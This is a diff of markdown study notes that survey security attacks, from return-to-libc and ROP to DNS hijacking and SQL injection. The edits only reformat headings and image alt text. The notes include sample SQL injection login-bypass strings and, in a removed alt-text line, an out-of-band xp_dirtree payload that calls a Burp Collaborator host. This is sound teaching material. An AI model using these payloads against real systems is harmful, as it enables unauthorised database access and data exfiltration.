@@ -6,7 +6,7 @@ Modified: 2022-04-23 12:01:26 +0500
 
 ---
 
-**Types of Security Attacks**
+## Types of Security Attacks
 
 1.  Passive Attack
 
@@ -22,31 +22,31 @@ Involves some modification of data stream or creation of false stream
 -   Modification
 -   Repudiation
 -   Denial of Service
-**Return to Libc Attack (Buffer/Heap overflow attack)**
+## Return to Libc Attack (Buffer/Heap overflow attack)
 
 It is a[computer security](https://en.wikipedia.org/wiki/Computer_security)attack usually starting with a[buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow)in which a subroutine[return address](https://en.wikipedia.org/wiki/Return_statement)on a[call stack](https://en.wikipedia.org/wiki/Call_stack)is replaced by an address of a subroutine that is already present in the process' executable memory, bypassing the[NX bit](https://en.wikipedia.org/wiki/NX_bit)feature (if present) and ridding the attacker of the need to inject their own code.-   Modify the return address to point to some function already residing in memory. (This works because single stack is shared by all functions of a process (library or user program)).
 Smashing the Stack for Fun and Profit by Aleph One
-**MITM Attack (Meet in the Middle Attack)**
+## MITM Attack (Meet in the Middle Attack)
 
 MITM attack attempts to find a value using both of the range (ciphertext) and domain (plaintext) of the composition of several functions (or block cipher) such that forward mapping through the first functions is the same as backward mapping (inverse image) through the last functions, quite literally meeting in the middle of the composed function.
 The Multidimensional MITM (MD-MITM) uses a combination of several simultaneous MITM-attacks as described above, where the meeting happens in the multiple positions in the composed function.
 [Man in the Middle & Needham--Schroeder Protocol - Computerphile](https://youtu.be/EtpdLBeIaus)
-**Return Oriented Programming**
+## Return Oriented Programming
 
 A technique by which an attacker can induce arbitrary behavior in a program whose control flow he has diverted - without injecting any code. A return-oriented programs chains together short instruction sequences already present in a program's address space, each of which ends in a "return" instruction.
-**DNS Hijacking**
+## DNS Hijacking
 
 Advertise malicious ip address for a DNS name
 
 Where a different ip address is broadcasted for the DNS name, that is pointing to malicious attacker.
-**SQL Injection**
+## SQL Injection
 
-**Linwood_Cole' OR 1=1;#**
+## Linwood_Cole' OR 1=1;#
 
-**'admin;--**
-**Types of SQL Injection**
+## 'admin;--
+## Types of SQL Injection
 
-![In-Band (Classic) SQL Injection Inferential (Blind) Boolean Out-of-Band Error Union Time ](media/Attacks-image1.jpeg)
+![image](media/Attacks-image1.jpeg)
 1.  **In-Band SQL Injection**
     -   **In-band SQLi occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack**
         -   **Retrieved data is presented directly in the application web page**
@@ -94,8 +94,8 @@ If the first character of the administrator's hashed password is an 'a', wait fo
         -   **A variety of protocols can be used (ex. DNS, HTTP)**
     -   **Example Payload:**
 
-![, exec master. .xp_dirtree ' //øefdymgw105w9inae8mg4dfrgim9ay. burpcollaborator .net/a• ](media/Attacks-image6.jpg)
-**Tools**
+![image](media/Attacks-image6.jpg)
+## Tools
 
 [https://github.com/sqlmapproje ct/sqlmap](https://github.com/sqlmapproje%20ct/sqlmap)
 [**https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/**](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
